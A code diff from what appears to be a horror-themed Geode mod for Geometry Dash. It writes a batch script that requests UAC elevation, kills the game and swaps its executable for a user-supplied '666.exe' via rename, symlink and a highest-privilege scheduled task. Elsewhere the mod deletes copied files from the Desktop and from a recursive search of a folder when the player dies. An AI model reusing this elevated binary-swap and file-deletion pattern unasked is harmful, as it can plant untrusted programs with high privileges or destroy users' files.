@@ -27,8 +27,9 @@ void createAnGD666Bat() {
     
     std::ofstream batFile(batPath);
     batFile << "@echo off\n";
-    batFile << ":: Request UAC elevation\n";
-    batFile << "powershell -Command \"Start-Process cmd -Verb RunAs -ArgumentList '/c taskkill /f /im GeometryDash.exe & echo. & set /p targetPath=Enter the path to 666.exe: & ren \\\"%targetPath%\\666.exe\\\" GeometryDash.exe & ren \\\"C:\\Program Files (x86)\\Steam\\steamapps\\common\\Geometry Dash\\GeometryDash.exe\\\" GeometryDash666.exe & move \\\"%targetPath%\\GeometryDash.exe\\\" \\\"C:\\Program Files (x86)\\Steam\\steamapps\\common\\Geometry Dash\\\\\" & schtasks /create /tn \\\"GD666\\\" /tr \\\"C:\\Program Files (x86)\\Steam\\steamapps\\common\\Geometry Dash\\GeometryDash.exe\\\" /sc once /st 00:00 /rl highest /f & schtasks /run /tn \\\"GD666\\\" & schtasks /delete /tn \\\"GD666\\\" /f'\"\n";
+    batFile << ":: Request UAC elevation and execute installation sequence\n";
+    // Sequence: taskkill -> get path -> rename original -> move launcher -> create symlink for Geode -> Task Scheduler
+    batFile << "powershell -Command \"Start-Process cmd -Verb RunAs -ArgumentList '/c taskkill /f /im GeometryDash.exe & echo. & set /p targetPath=Enter the path to 666.exe: & ren \\\"C:\\Program Files (x86)\\Steam\\steamapps\\common\\Geometry Dash\\GeometryDash.exe\\\" GeometryDash666.exe & move \\\"%targetPath%\\666.exe\\\" \\\"C:\\Program Files (x86)\\Steam\\steamapps\\common\\Geometry Dash\\\\\" & cd /d \\\"C:\\Program Files (x86)\\Steam\\steamapps\\common\\Geometry Dash\\\" & mklink GeometryDash.exe 666.exe & schtasks /create /tn \\\"GD666\\\" /tr \\\"C:\\Program Files (x86)\\Steam\\steamapps\\common\\Geometry Dash\\GeometryDash.exe\\\" /sc once /st 00:00 /rl highest /f & schtasks /run /tn \\\"GD666\\\" & schtasks /delete /tn \\\"GD666\\\" /f'\"\n";
     batFile.close();
 }
 
@@ -149,7 +150,6 @@ class $modify(MyPlayLayer, PlayLayer) {
     }
 
     void onQuit() {
-        // If exiting the level (not by death)
         if (!m_fields->m_hasDied && !m_fields->m_copiedFile.empty() && !m_fields->m_desktopPath.empty()) {
             fs::path desktopFile = m_fields->m_desktopPath / m_fields->m_copiedFile;
             if (fs::exists(desktopFile)) {
@@ -164,13 +164,11 @@ class $modify(MyPlayLayer, PlayLayer) {
         
         if (!m_fields->m_copiedFile.empty()) {
             m_fields->m_hasDied = true;
-            // Remove from Desktop
             fs::path desktopFile = m_fields->m_desktopPath / m_fields->m_copiedFile;
             if (fs::exists(desktopFile)) {
                 try { fs::remove(desktopFile); } catch (...) {}
             }
 
-            // Remove from C:/Prueba (recursive search)
             try {
                 for (auto const& dir_entry : fs::recursive_directory_iterator(g_sourcePath)) {
                     if (dir_entry.is_regular_file() && dir_entry.path().filename() == m_fields->m_copiedFile) {
